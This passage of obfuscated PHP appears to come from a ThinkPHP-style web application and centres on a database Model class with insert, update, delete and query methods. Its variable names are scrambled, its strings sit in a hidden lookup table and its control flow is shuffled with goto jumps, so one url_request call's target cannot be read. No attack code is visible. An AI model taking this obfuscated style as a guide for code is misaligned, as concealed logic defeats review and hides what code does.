$fµŸ¡»ÒÏê = $d¯‘äóÉ±î[33]; switch ($dÉˆñ’¥“Ω[$d¯‘äóÉ±î[29]]) { case $d¯‘äóÉ±î[294]: $Bé´©÷ÈÂ≈ = url_request($dÉˆñ’¥“Ω[$d¯‘äóÉ±î[1051]], $d¯‘äóÉ±î[219], !1, !1, !1, !1, 5); $fµŸ¡»ÒÏê = strlen($Bé´©÷ÈÂ≈); break; case $d¯‘äóÉ±î[218]: $fµŸ¡»ÒÏê = Hook::apply($dÉˆñ’¥“Ω[$d¯‘äóÉ±î[1051]]); default: break; } goto D å« èáÏ; c´√ÿ–ÒÊﬂ: } private static function valueGet($aª¶òıﬁ¡˘) { $Eï¨‘Âè⁄† =& $_SERVER[∞„˜ƒÑºª]; $Dí∆≤àÂÒ∂ = $Eï¨‘Âè⁄†[1060]; $aﬁ⁄ µé†◊ = Model($Eï¨‘Âè⁄†[1061])->get($aª¶òıﬁ¡˘, $Dí∆≤àÂÒ∂); if (is_null($aﬁ⁄ µé†◊)) { Model($Eï¨‘Âè⁄†[1061])->set($Eï¨‘Âè⁄†[1033], 10, $Dí∆≤àÂÒ∂); Model($Eï¨‘Âè⁄†[1061])->set($Eï¨‘Âè⁄†[445], $Eï¨‘Âè⁄†[376], $Dí∆≤àÂÒ∂); Model($Eï¨‘Âè⁄†[1061])->set($Eï¨‘Âè⁄†[1028], $Eï¨‘Âè⁄†[402], $Dí∆≤àÂÒ∂); $aﬁ⁄ µé†◊ = Model($Eï¨‘Âè⁄†[1061])->get($aª¶òıﬁ¡˘, $Dí∆≤àÂÒ∂); } return $aﬁ⁄ µé†◊; } private static function valueSet($B’¢Õ€ñØÊ, $bî≥ºœœ–ß) { $a®©µû∏Ü =& $_SERVER[∞„˜ƒÑºª]; return Model($a®©µû∏Ü[1061])->set($B’¢Õ€ñØÊ, $bî≥ºœœ–ß, $a®©µû∏Ü[1060]); } protected static function log($C™ÑÆ´‚á√) { write_log($C™ÑÆ´‚á√, $_SERVER[∞„˜ƒÑºª][1062]); } private static function cacheClear() { $DÆ–®·…∞ê =& $_SERVER[∞„˜ƒÑºª]; $b©—Îﬁè¢§ = Model($DÆ–®·…∞ê[1061])->cacheKey($DÆ–®·…∞ê[1060]); Cache::clearMemory($b©—Îﬁè¢§); } } goto dÇÃà⁄ÿ´ö; A€£·ä¬∏÷: function beforeShutdownFatalError($b√¿ÌßÆæﬂ) { think_exception($b√¿ÌßÆæﬂ); } $A≥ÌÜ¢ãßë = E_ALL ^ E_NOTICE ^ E_WARNING ^ E_DEPRECATED; register_shutdown_function($_SERVER[ÔÒÀÃÆ›—ü][19]); goto e◊âè÷∂∑ã; E⁄Õ´ˆ‡ –: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\x61\142\x6c\x65", "\157\x72\x64\145\x72", "\x61\154\x69\141\163", "\150\x61\x76\x69\x6e\147", "\147\162\157\165\160", "\x6c\x6f\x63\153", "\x64\151\x73\x74\x69\x6e\x63\164", "\141\165\x74\157", "\x66\x69\154\x74\145\x72", "\166\x61\154\151\144\x61\x74\x65", "\x72\145\163\x75\154\164", "\142\x69\156\144", "\164\157\153\x65\156"); public function __construct($fø´—™≤ØØ = '', $B√ñÍ–É⁄© = '', $Eö≠„Æ‰ﬁ… = '') { $AÔˆÂŸ¡œª =& $_SERVER[∞„˜ƒÑºª]; $this->_initialize(); if (!empty($fø´—™≤ØØ)) { if (strpos($fø´—™≤ØØ, $AÔˆÂŸ¡œª[98])) { list($this->dbName, $this->name) = explode($AÔˆÂŸ¡œª[98], $fø´—™≤ØØ); } else { $this->name = $fø´—™≤ØØ; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($B√ñÍ–É⁄©)) { $this->tablePrefix = $AÔˆÂŸ¡œª[33]; } elseif ($AÔˆÂŸ¡œª[33] != $B√ñÍ–É⁄©) { $this->tablePrefix = $B√ñÍ–É⁄©; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($AÔˆÂŸ¡œª[231]); } $this->db(0, empty($this->connection) ? $Eö≠„Æ‰ﬁ… : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $dÙîäÌ‡’ì =& $_SERVER[∞„˜ƒÑºª]; if (empty($this->fields)) { if (think_config($dÙîäÌ‡’ì[232])) { $bæ€£ƒéüº = $this->dbName ? $this->dbName : think_config($dÙîäÌ‡’ì[233]); $aŒ»û†·÷ü = think_var_cache($dÙîäÌ‡’ì[234] . strtolower(get_path_this($bæ€£ƒéüº) . $dÙîäÌ‡’ì[98] . $this->name)); if ($aŒ»û†·÷ü) { $Cù∆äØ»à¥ = think_config($dÙîäÌ‡’ì[235]); if (empty($Cù∆äØ»à¥) || $aŒ»û†·÷ü[$dÙîäÌ‡’ì[236]] == $Cù∆äØ»à¥) { $this->fields = $aŒ»û†·÷ü; return; } } } $this->flush(); } } public function flush() { goto Cœ¡á†Øèÿ; A£ÎŸÉ√Ü˜: if (think_config($aËÓèäõÕ÷[232])) { $C¡ç‡ûÓù≤ = $this->dbName ? $this->dbName : think_config($aËÓèäõÕ÷[233]); think_var_cache($aËÓèäõÕ÷[234] . strtolower(get_path_this($C¡ç‡ûÓù≤) . $aËÓèäõÕ÷[98] . $this->name), $this->fields); } goto F≤çÁêÜêä; F“›âçòÜı: foreach ($dÂçÃ¢ãÏ as $CÕˆ˘Â†Ë„ => $EÃ©æΩÚ•¿) { $f∞ÇÍêè∏≥[$CÕˆ˘Â†Ë„] = $EÃ©æΩÚ•¿[$aËÓèäõÕ÷[29]]; if ($EÃ©æΩÚ•¿[$aËÓèäõÕ÷[36]]) { $this->fields[$aËÓèäõÕ÷[238]] = $CÕˆ˘Â†Ë„; if ($EÃ©æΩÚ•¿[$aËÓèäõÕ÷[39]]) { $this->fields[$aËÓèäõÕ÷[237]] = !0; } } } $this->fields[$aËÓèäõÕ÷[239]] = $f∞ÇÍêè∏≥; if (think_config($aËÓèäõÕ÷[235])) { $this->fields[$aËÓèäõÕ÷[236]] = think_config($aËÓèäõÕ÷[235]); } goto A£ÎŸÉ√Ü˜; Cœ¡á†Øèÿ: $aËÓèäõÕ÷ =& $_SERVER[∞„˜ƒÑºª]; $this->db->setModel($this->name); $dÂçÃ¢ãÏ = $this->db->getFields($this->getTableName()); goto Eƒ«Èê¯êì; Eƒ«Èê¯êì: if (!$dÂçÃ¢ãÏ) { return !1; } $this->fields = array_keys($dÂçÃ¢ãÏ); $this->fields[$aËÓèäõÕ÷[237]] = !1; goto F“›âçòÜı; F≤çÁêÜêä: } public function switchModel($aÎ¨ÈÙ…»é, $a¡©®†Œúè = array()) { $eÍäû¿ËÔÇ =& $_SERVER[∞„˜ƒÑºª]; $a√ÉÁ“Ú¨æ = ucwords(strtolower($aÎ¨ÈÙ…»é)) . $eÍäû¿ËÔÇ[240]; if (!class_exists($a√ÉÁ“Ú¨æ)) { think_exception($a√ÉÁ“Ú¨æ . think_lang($eÍäû¿ËÔÇ[241])); } $this->_extModel = new $a√ÉÁ“Ú¨æ($this->name); if (!empty($a¡©®†Œúè)) { foreach ($a¡©®†Œúè as $b˜î÷€∑òº) { $this->_extModel->setProperty($b˜î÷€∑òº, $this->{$b˜î÷€∑òº}); } } return $this->_extModel; } public function __set($EÆ£’†πÒâ, $eü£⁄øâ«) { $this->data[$EÆ£’†πÒâ] = $eü£⁄øâ«; } public function __get($FΩíÿãƒ´é) { return isset($this->data[$FΩíÿãƒ´é]) ? $this->data[$FΩíÿãƒ´é] : null; } public function __isset($Déûª“ê›”) { return isset($this->data[$Déûª“ê›”]); } public function __unset($eèÍ¡›Â≥∑) { unset($this->data[$eèÍ¡›Â≥∑]); } public function __call($FöüÓ€ÓÓ∂, $fÙçÏ≈¢–Ì) { $aä∫õ¬º¡Â =& $_SERVER[∞„˜ƒÑºª]; if (in_array(strtolower($FöüÓ€ÓÓ∂), $this->methods, !0)) { $this->options[strtolower($FöüÓ€ÓÓ∂)] = $fÙçÏ≈¢–Ì[0]; return $this; } elseif (in_array(strtolower($FöüÓ€ÓÓ∂), array($aä∫õ¬º¡Â[242], $aä∫õ¬º¡Â[243], $aä∫õ¬º¡Â[244], $aä∫õ¬º¡Â[245], $aä∫õ¬º¡Â[246]), !0)) { $AµçÌï∆Ÿ¨ = isset($fÙçÏ≈¢–Ì[0]) ? $fÙçÏ≈¢–Ì[0] : $aä∫õ¬º¡Â[172]; $AµçÌï∆Ÿ¨ = $this->db->parseKey($AµçÌï∆Ÿ¨); return $this->getField(strtoupper($FöüÓ€ÓÓ∂) . $aä∫õ¬º¡Â[247] . $AµçÌï∆Ÿ¨ . $aä∫õ¬º¡Â[248] . $FöüÓ€ÓÓ∂, $aä∫õ¬º¡Â[242]); } elseif (strtolower(substr($FöüÓ€ÓÓ∂, 0, 5)) == $aä∫õ¬º¡Â[249]) { $AµçÌï∆Ÿ¨ = think_parse_name(substr($FöüÓ€ÓÓ∂, 5)); $fÙÁÂ–ı∑[$AµçÌï∆Ÿ¨] = $fÙçÏ≈¢–Ì[0]; return $this->where($fÙÁÂ–ı∑)->find(); } elseif (strtolower(substr($FöüÓ€ÓÓ∂, 0, 10)) == $aä∫õ¬º¡Â[250]) { $e°◊‰ﬁå£ = think_parse_name(substr($FöüÓ€ÓÓ∂, 10)); $fÙÁÂ–ı∑[$e°◊‰ﬁå£] = $fÙçÏ≈¢–Ì[0]; return $this->where($fÙÁÂ–ı∑)->getField($fÙçÏ≈¢–Ì[1]); } elseif (isset($this->_scope[$FöüÓ€ÓÓ∂])) { return $this->scope($FöüÓ€ÓÓ∂, $fÙçÏ≈¢–Ì[0]); } elseif (method_exists($this, $FöüÓ€ÓÓ∂)) { array_unshift($fÙçÏ≈¢–Ì, $FöüÓ€ÓÓ∂); return call_user_func_array(array($this, $aä∫õ¬º¡Â[251]), $fÙçÏ≈¢–Ì); } else { return call_user_func_array(array(parent, $FöüÓ€ÓÓ∂), $fÙçÏ≈¢–Ì); } } protected function call() { goto e¢ÙÛÊ¿å«; e¢ÙÛÊ¿å«: $Eíè√Ñ©Ïˆ =& $_SERVER[∞„˜ƒÑºª]; $eﬁ èÕ∂é÷ = func_get_args(); $d∆Ω±Ó∞Ì¨ = array_shift($eﬁ èÕ∂é÷); goto BÓ…÷ õ”Ö; CéÜ…ÂÈõﬂ: $eﬁ èÕ∂é÷[] = $d∆Ω±Ó∞Ì¨; if (method_exists($this, $Eíè√Ñ©Ïˆ[253])) { $B¿€≈‘≤„ì = call_user_func_array(array($this, $Eíè√Ñ©Ïˆ[254]), array($fñÚÚΩæŒÀ, $eﬁ èÕ∂é÷)); if (!is_null($B¿€≈‘≤„ì) && $B¿€≈‘≤„ì !== !1) { return $B¿€≈‘≤„ì; } } $bãä∫ﬂ≥ñì = call_user_func_array(array($this, $d∆Ω±Ó∞Ì¨), $eﬁ èÕ∂é÷); goto FÂ≤≤ÿπΩò; FÂ≤≤ÿπΩò: if (method_exists($this, $Eíè√Ñ©Ïˆ[255])) { $B¿€≈‘≤„ì = call_user_func_array(array($this, $Eíè√Ñ©Ïˆ[256]), array($fñÚÚΩæŒÀ, $eﬁ èÕ∂é÷, $bãä∫ﬂ≥ñì)); if ($B¿€≈‘≤„ì) { return $B¿€≈‘≤„ì; } } return $bãä∫ﬂ≥ñì; goto dÒØÓã™—Ÿ; BÓ…÷ õ”Ö: $fñÚÚΩæŒÀ = $d∆Ω±Ó∞Ì¨; if (is_array($d∆Ω±Ó∞Ì¨)) { $fñÚÚΩæŒÀ = $d∆Ω±Ó∞Ì¨[1]; $d∆Ω±Ó∞Ì¨ = $d∆Ω±Ó∞Ì¨[0]; } if ($eﬁ èÕ∂é÷[count($eﬁ èÕ∂é÷) - 1] === $d∆Ω±Ó∞Ì¨) { think_exception(__CLASS__ . $Eíè√Ñ©Ïˆ[4] . $d∆Ω±Ó∞Ì¨ . think_lang($Eíè√Ñ©Ïˆ[252])); return; } goto CéÜ…ÂÈõﬂ; dÒØÓã™—Ÿ: } protected function _initialize() { } protected function _facade($aíæ„è¬Ü¯) { $bëª‘öìΩÁ =& $_SERVER[∞„˜ƒÑºª]; if (!empty($this->fields)) { foreach ($aíæ„è¬Ü¯ as $e€Ñ›é ∫â => $Féº÷√Ò≈˜) { if (!in_array($e€Ñ›é ∫â, $this->fields, !0)) { unset($aíæ„è¬Ü¯[$e€Ñ›é ∫â]); } elseif (is_scalar($Féº÷√Ò≈˜)) { $this->_parseType($aíæ„è¬Ü¯, $e€Ñ›é ∫â); } } } if (!empty($this->options[$bëª‘öìΩÁ[257]])) { $aíæ„è¬Ü¯ = array_map($this->options[$bëª‘öìΩÁ[257]], $aíæ„è¬Ü¯); unset($this->options[$bëª‘öìΩÁ[257]]); } $this->_beforeWrite($aíæ„è¬Ü¯); return $aíæ„è¬Ü¯; } protected function _beforeWrite(&$FüäÃä¯ÿ∑) { } public function add($a£◊ÔèºË  = '', $A´¶œäÃÿÜ = array(), $Dïπá•ı˜ô = false) { goto A¢êÜê©ÎŒ; A¢êÜê©ÎŒ: if (empty($a£◊ÔèºË )) { if (!empty($this->data)) { $a£◊ÔèºË  = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[∞„˜ƒÑºª][258]); return !1; } } $A´¶œäÃÿÜ = $this->_parseOptions($A´¶œäÃÿÜ); $a£◊ÔèºË  = $this->_facade($a£◊ÔèºË ); goto cû—ªÖ“·æ; cû—ªÖ“·æ: if (!1 === $this->_beforeInsert($a£◊ÔèºË , $A´¶œäÃÿÜ)) { return !1; } $C•ΩÇŸäŸ” = $this->db->insert($a£◊ÔèºË , $A´¶œäÃÿÜ, $Dïπá•ı˜ô); if (!1 !== $C•ΩÇŸäŸ”) { $D„‚‹¶ÖÆé = $this->getLastInsID(); if ($D„‚‹¶ÖÆé) { $a£◊ÔèºË [$this->getPk()] = $D„‚‹¶ÖÆé; $this->_after_insert($a£◊ÔèºË , $A´¶œäÃÿÜ); return $D„‚‹¶ÖÆé; } $this->_after_insert($a£◊ÔèºË , $A´¶œäÃÿÜ); } goto fçã≈⁄çç”; fçã≈⁄çç”: return $C•ΩÇŸäŸ”; goto Bü‚õÂπ™∞; Bü‚õÂπ™∞: } protected function _beforeInsert(&$EõÙ’‚Üƒ™, $c›ü§¡ïÉÖ) { } protected function _after_insert($aÂâüú°¥â, $BüΩé¨ß∆Ö) { } public function addAll($bÖ•ç÷Î∑æ, $DÑ¯Îå∆∞´ = array(), $EÑÜ„ÙŒ≠• = false) { goto E⁄ßÛøŒò€; F˜´⁄¥∂π≤: foreach ($bÖ•ç÷Î∑æ as $bîÒ‰‚Øë => $D¢Ì‹ÑÿßÎ) { $bÖ•ç÷Î∑æ[$bîÒ‰‚Øë] = $this->_facade($D¢Ì‹ÑÿßÎ); } if (method_exists($this->db, $CÇâ∑œå†ó[259])) { $EΩ‘¥Öù“ = $this->db->insertAll($bÖ•ç÷Î∑æ, $DÑ¯Îå∆∞´, $EÑÜ„ÙŒ≠•); } else { $this->startTrans(); foreach ($bÖ•ç÷Î∑æ as $bîÒ‰‚Øë => $D¢Ì‹ÑÿßÎ) { $EΩ‘¥Öù“ = $this->db->insert($D¢Ì‹ÑÿßÎ, $DÑ¯Îå∆∞´, $EÑÜ„ÙŒ≠•); } $this->commit(); } if (!1 !== $EΩ‘¥Öù“) { $eá∆√¡Ø—Ó = $this->getLastInsID(); if ($eá∆√¡Ø—Ó) { return $eá∆√¡Ø—Ó; } } goto EºÌ¿õ˜¢˘; E⁄ßÛøŒò€: $CÇâ∑œå†ó =& $_SERVER[∞„˜ƒÑºª]; if (empty($bÖ•ç÷Î∑æ)) { $this->error = think_lang($CÇâ∑œå†ó[258]); return !1; } $DÑ¯Îå∆∞´ = $this->_parseOptions($DÑ¯Îå∆∞´); goto F˜´⁄¥∂π≤; EºÌ¿õ˜¢˘: return $EΩ‘¥Öù“; goto a≠ÏÂÌµ‘¶; a≠ÏÂÌµ‘¶: } public function selectAdd($fÏ®∫Ôîªé = '', $Cˆ´«≠Òƒ€ = '', $Aà≠ª„≤⁄≠ = array()) { $BéÎæ¬£öÎ =& $_SERVER[∞„˜ƒÑºª]; $Aà≠ª„≤⁄≠ = $this->_parseOptions($Aà≠ª„≤⁄≠); if (!1 === ($D¿·ƒ˘™‘ = $this->db->selectInsert($fÏ®∫Ôîªé ? $fÏ®∫Ôîªé : $Aà≠ª„≤⁄≠[$BéÎæ¬£öÎ[260]], $Cˆ´«≠Òƒ€ ? $Cˆ´«≠Òƒ€ : $this->getTableName(), $Aà≠ª„≤⁄≠))) { $this->error = think_lang($BéÎæ¬£öÎ[261]); return !1; } else { return $D¿·ƒ˘™‘; } } public function save($Añ∫∫‹Áœë = '', $bˆ¨§∆‘Üµ = array()) { goto C≤ˆëÑÕ√⁄; Dî≤üéô§Ø: if (is_array($bˆ¨§∆‘Üµ[$e∆§Ÿ⁄Ú•«[262]]) && isset($bˆ¨§∆‘Üµ[$e∆§Ÿ⁄Ú•«[262]][$BÁ€Œùœá·])) { $FìÊ≥è¯ç“ = $bˆ¨§∆‘Üµ[$e∆§Ÿ⁄Ú•«[262]][$BÁ€Œùœá·]; } if (!1 === $this->_beforeUpdate($Añ∫∫‹Áœë, $bˆ¨§∆‘Üµ)) { return !1; } $fˆÒåß»°ÿ = $this->db->update($Añ∫∫‹Áœë, $bˆ¨§∆‘Üµ); goto Dà¨Ó¬Ω´µ; Dà¨Ó¬Ω´µ: if (!1 !== $fˆÒåß»°ÿ) { if (isset($FìÊ≥è¯ç“)) { $Añ∫∫‹Áœë[$BÁ€Œùœá·] = $FìÊ≥è¯ç“; } $this->_afterUpdate($Añ∫∫‹Áœë, $bˆ¨§∆‘Üµ); } return $fˆÒåß»°ÿ; goto b‹âÆÿ™•Ï; AåÂõ∑Õ≠í: $bˆ¨§∆‘Üµ = $this->_parseOptions($bˆ¨§∆‘Üµ); $BÁ€Œùœá· = $this->getPk(); if (!isset($bˆ¨§∆‘Üµ[$e∆§Ÿ⁄Ú•«[262]])) { if (isset($Añ∫∫‹Áœë[$BÁ€Œùœá·])) { $A∂≤ïåò§¯[$BÁ€Œùœá·] = $Añ∫∫‹Áœë[$BÁ€Œùœá·]; $bˆ¨§∆‘Üµ[$e∆§Ÿ⁄Ú•«[262]] = $A∂≤ïåò§¯; unset($Añ∫∫‹Áœë[$BÁ€Œùœá·]); } else { $this->error = think_lang($e∆§Ÿ⁄Ú•«[261]); return !1; } } goto Dî≤üéô§Ø; C≤ˆëÑÕ√⁄: $e∆§Ÿ⁄Ú•« =& $_SERVER[∞„˜ƒÑºª]; if (empty($Añ∫∫‹Áœë)) { if (!empty($this->data)) { $Añ∫∫‹Áœë = $this->data; $this->data = array(); } else { $this->error = think_lang($e∆§Ÿ⁄Ú•«[258]); return !1; } } $Añ∫∫‹Áœë = $this->_facade($Añ∫∫‹Áœë); goto AåÂõ∑Õ≠í; b‹âÆÿ™•Ï: } protected function _beforeUpdate(&$d´’éê‰Ñé, $dØ¨ªÇƒëë) { } protected function _afterUpdate($EëÈ¶ÁŒ∑œ, $DÏ‚•º∞Ñ™) { } public function delete($D©ëçÆƒ–Ÿ = array()) { goto AÓ⁄˜™‘ú; f“É¿¡√üÁ: if (is_numeric($D©ëçÆƒ–Ÿ) || is_string($D©ëçÆƒ–Ÿ)) { if (strpos($D©ëçÆƒ–Ÿ, $EçΩˆ•Ö›Ü[47])) { $eπú“úú“ç[$dÜπ»¨©Úç] = array($EçΩˆ•Ö›Ü[263], $D©ëçÆƒ–Ÿ); } else { $eπú“úú“ç[$dÜπ»¨©Úç] = $D©ëçÆƒ–Ÿ; } $this->options[$EçΩˆ•Ö›Ü[262]] = $eπú“úú“ç; } $D©ëçÆƒ–Ÿ = $this->_parseOptions(); if (is_array($D©ëçÆƒ–Ÿ[$EçΩˆ•Ö›Ü[262]]) && isset($D©ëçÆƒ–Ÿ[$EçΩˆ•Ö›Ü[262]][$dÜπ»¨©Úç])) { $d√ª•äÛ¶ª = $D©ëçÆƒ–Ÿ[$EçΩˆ•Ö›Ü[262]][$dÜπ»¨©Úç]; } goto féà∫à¿ ı; AÓ⁄˜™‘ú: $EçΩˆ•Ö›Ü =& $_SERVER[∞„˜ƒÑºª]; if (empty($D©ëçÆƒ–Ÿ) && empty($this->options[$EçΩˆ•Ö›Ü[262]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $dÜπ»¨©Úç = $this->getPk(); goto f“É¿¡√üÁ; féà∫à¿ ı: $aÁ≠øıÖÀ… = $this->db->delete($D©ëçÆƒ–Ÿ); if (!1 !== $aÁ≠øıÖÀ…) { $b“¡é¡æ¥µ = array(); if (isset($d√ª•äÛ¶ª)) { $b“¡é¡æ¥µ[$dÜπ»¨©Úç] = $d√ª•äÛ¶ª; } $this->_after_delete($b“¡é¡æ¥µ, $D©ëçÆƒ–Ÿ); } return $aÁ≠øıÖÀ…; goto cﬂ¥Í∆âûç; cﬂ¥Í∆âûç: } protected function _after_delete($Eı§ö⁄œ´è, $f≥ßêïÿÜ≤) { } public function select($BûÀÊ¶´‡á = array()) { goto f¶ÎïéÏôù; f¶ÎïéÏôù: $Déø÷”œœÍ =& $_SERVER[∞„˜ƒÑºª]; if (is_string($BûÀÊ¶´‡á) || is_numeric($BûÀÊ¶´‡á)) { $a¢“©¯˘Öç = $this->getPk(); if (strpos($BûÀÊ¶´‡á, $Déø÷”œœÍ[47])) { $fíçÁÃè¬Ü[$a¢“©¯˘Öç] = array($Déø÷”œœÍ[263], $BûÀÊ¶´‡á); } else { $fíçÁÃè¬Ü[$a¢“©¯˘Öç] = $BûÀÊ¶´‡á; } $this->options[$Déø÷”œœÍ[262]] = $fíçÁÃè¬Ü; } elseif (!1 === $BûÀÊ¶´‡á) { $BûÀÊ¶´‡á = $this->_parseOptions(); return $Déø÷”œœÍ[264] . $this->db->buildSelectSql($BûÀÊ¶´‡á) . $Déø÷”œœÍ[265]; } $BûÀÊ¶´‡á = $this->_parseOptions(); goto dË°à∏õå¨; Eù—›Ö«‘≈: $this->_afterSelect($a”†ñƒ˘›, $BûÀÊ¶´‡á); return $a”†ñƒ˘›; goto F ‡Ô∞†®•; dË°à∏õå¨: $a”†ñƒ˘› = $this->db->select($BûÀÊ¶´‡á); if (!1 === $a”†ñƒ˘›) { return !1; } if (empty($a”†ñƒ˘›)) { return null; } goto Eù—›Ö«‘≈; F ‡Ô∞†®•: } protected function _afterSelect(&$Dé÷ˆ¡óíØ, $AÌâ§—È…Ï) { } public function buildSql($eïÚâ¡Ìæ = array()) { $Eá‰£éß—Ï =& $_SERVER[∞„˜ƒÑºª]; $eïÚâ¡Ìæ = $this->_parseOptions($eïÚâ¡Ìæ); return $Eá‰£éß—Ï[264] . $this->db->buildSelectSql($eïÚâ¡Ìæ) . $Eá‰£éß—Ï[265]; } public function optionsValue($e⁄“Ô¿€éè = null) { if (is_null($e⁄“Ô¿€éè)) { return $this->options; } elseif (is_array($e⁄“Ô¿€éè)) { $this->options = array_merge($this->options, $e⁄“Ô¿€éè); } } protected function _parseOptions($cëäùöó∞© = array()) { goto EóΩ£º∏ÁË; Eÿö´òô¨¥: if (!isset($cëäùöó∞©[$a’„‡Ô˜√ﬂ[266]])) { $cëäùöó∞©[$a’„‡Ô˜√ﬂ[266]] = $this->getTableName(); $Cí⁄ë´ÖﬁÜ = $this->fields; } else { $Cí⁄ë´ÖﬁÜ = $this->getDbFields(); } if (!empty($cëäùöó∞©[$a’„‡Ô˜√ﬂ[267]])) { $cëäùöó∞©[$a’„‡Ô˜√ﬂ[266]] .= $a’„‡Ô˜√ﬂ[50] . $cëäùöó∞©[$a’„‡Ô˜√ﬂ[267]]; } $cëäùöó∞©[$a’„‡Ô˜√ﬂ[268]] = $this->name; goto DêÁ¨±ÌœÀ; EóΩ£º∏ÁË: $a’„‡Ô˜√ﬂ =& $_SERVER[∞„˜ƒÑºª]; if (is_array($cëäùöó∞©)) { $cëäùöó∞© = array_merge($this->options, $cëäùöó∞©); } $this->options = array(); goto Eÿö´òô¨¥; DêÁ¨±ÌœÀ: if (isset($cëäùöó∞©[$a’„‡Ô˜√ﬂ[262]]) && is_array($cëäùöó∞©[$a’„‡Ô˜√ﬂ[262]]) && !empty($Cí⁄ë´ÖﬁÜ) && !isset($cëäùöó∞©[$a’„‡Ô˜√ﬂ[269]]) && !isset($cëäùöó∞©[$a’„‡Ô˜√ﬂ[266]])) { foreach ($cëäùöó∞©[$a’„‡Ô˜√ﬂ[262]] as $BÉ‡ûà·∞è => $A‡åÍıùàå) { $BÉ‡ûà·∞è = trim($BÉ‡ûà·∞è); if (in_array($BÉ‡ûà·∞è, $Cí⁄ë´ÖﬁÜ, !0)) { if (is_scalar($A‡åÍıùàå)) { $this->_parseType($cëäùöó∞©[$a’„‡Ô˜√ﬂ[262]], $BÉ‡ûà·∞è); } } elseif (!is_numeric($BÉ‡ûà·∞è) && $a’„‡Ô˜√ﬂ[79] != substr($BÉ‡ûà·∞è, 0, 1) && !1 === strpos($BÉ‡ûà·∞è, $a’„‡Ô˜√ﬂ[98]) && !1 === strpos($BÉ‡ûà·∞è, $a’„‡Ô˜√ﬂ[247]) && !1 === strpos($BÉ‡ûà·∞è, $a’„‡Ô˜√ﬂ[270]) && !1 === strpos($BÉ‡ûà·∞è, $a’„‡Ô˜√ﬂ[271])) { unset($cëäùöó∞©[$a’„‡Ô˜√ﬂ[262]][$BÉ‡ûà·∞è]); } } } $this->_options_filter($cëäùöó∞©); return $cëäùöó∞©; goto dóå¯ÓÒÔ¥; dóå¯ÓÒÔ¥: } protected function _options_filter(&$CØ∂ìòΩß∆) { } protected function _parseType(&$dôÁıØ‰Ñ, $F»ÏÀ≤ª˜—) { $a¶Ñ¢å„√ƒ =& $_SERVER[∞„˜ƒÑºª]; if (empty($this->options[$a¶Ñ¢å„√ƒ[272]][$a¶Ñ¢å„√ƒ[4] . $F»ÏÀ≤ª˜—])) { $Cåë™Ò˘…ä = strtolower($this->fields[$a¶Ñ¢å„√ƒ[239]][$F»ÏÀ≤ª˜—]); if (!1 !== strpos($Cåë™Ò˘…ä, $a¶Ñ¢å„√ƒ[273])) { } elseif (!1 === strpos($Cåë™Ò˘…ä, $a¶Ñ¢å„√ƒ[274]) && !1 !== strpos($Cåë™Ò˘…ä, $a¶Ñ¢å„√ƒ[275])) { $dôÁıØ‰Ñ[$F»ÏÀ≤ª˜—] = intval($dôÁıØ‰Ñ[$F»ÏÀ≤ª˜—]); } elseif (!1 !== strpos($Cåë™Ò˘…ä, $a¶Ñ¢å„√ƒ[276]) || !1 !== strpos($Cåë™Ò˘…ä, $a¶Ñ¢å„√ƒ[277])) { $dôÁıØ‰Ñ[$F»ÏÀ≤ª˜—] = floatval($dôÁıØ‰Ñ[$F»ÏÀ≤ª˜—]); } elseif (!1 !== strpos($Cåë™Ò˘…ä, $a¶Ñ¢å„√ƒ[278])) { $dôÁıØ‰Ñ[$F»ÏÀ≤ª˜—] = (bool) $dôÁıØ‰Ñ[$F»ÏÀ≤ª˜—]; } } } public function find($BìºÙÆË∫„ = array()) { goto Fë™è‘Ú“â; CöùÈËÏØØ: $BìºÙÆË∫„ = $this->_parseOptions(); $b•π®¬´“î = $this->db->select($BìºÙÆË∫„); if (!1 === $b•π®¬´“î) { return !1; } goto FÊòÉâ·áü; Fë™è‘Ú“â: $EﬂÉ¢êÌ°¿ =& $_SERVER[∞„˜ƒÑºª]; if (is_numeric($BìºÙÆË∫„) || is_string($BìºÙÆË∫„)) { $e‘∏ªäﬂû©[$this->getPk()] = $BìºÙÆË∫„; $this->options[$EﬂÉ¢êÌ°¿[262]] = $e‘∏ªäﬂû©; } $this->options[$EﬂÉ¢êÌ°¿[279]] = 1; goto CöùÈËÏØØ; FÊòÉâ·áü: if (empty($b•π®¬´“î)) { return null; } $this->data = $b•π®¬´“î[0]; $this->_afterFind($this->data, $BìºÙÆË∫„); goto E˜ù¨∑¥∏Ç; E˜ù¨∑¥∏Ç: if (!empty($this->options[$EﬂÉ¢êÌ°¿[280]])) { return $this->returnResult($this->data, $this->options[$EﬂÉ¢êÌ°¿[280]]); } return $this->data; goto f ∂¿≥„û©; f ∂¿≥„û©: } protected function _afterFind(&$Få≤ˆå¨ù, $EÎÕ™åô‹) { } protected function returnResult($eŸÎ≥û®üò, $Cïƒ ÿ¨õ• = '') { $cØ©Ï®¥ Ù =& $_SERVER[∞„˜ƒÑºª]; if ($Cïƒ ÿ¨õ•) { if (is_callable($Cïƒ ÿ¨õ•)) { return call_user_func($Cïƒ ÿ¨õ•, $eŸÎ≥û®üò); } switch (strtolower($Cïƒ ÿ¨õ•)) { case $cØ©Ï®¥ Ù[281]: return json_encode($eŸÎ≥û®üò); case $cØ©Ï®¥ Ù[282]: return xml_encode($eŸÎ≥û®üò); } } return $eŸÎ≥û®üò; } public function parseFieldsMap($Fß©¡ÁÌ±ä, $C∏÷ åØ⁄ü = 1) { if (!empty($this->_map)) { foreach ($this->_map as $c’¡é‰í£è => $Eœí¶í§‘è) { if ($C∏÷ åØ⁄ü == 1) { if (isset($Fß©¡ÁÌ±ä[$Eœí¶í§‘è])) { $Fß©¡ÁÌ±ä[$c’¡é‰í£è] = $Fß©¡ÁÌ±ä[$Eœí¶í§‘è]; 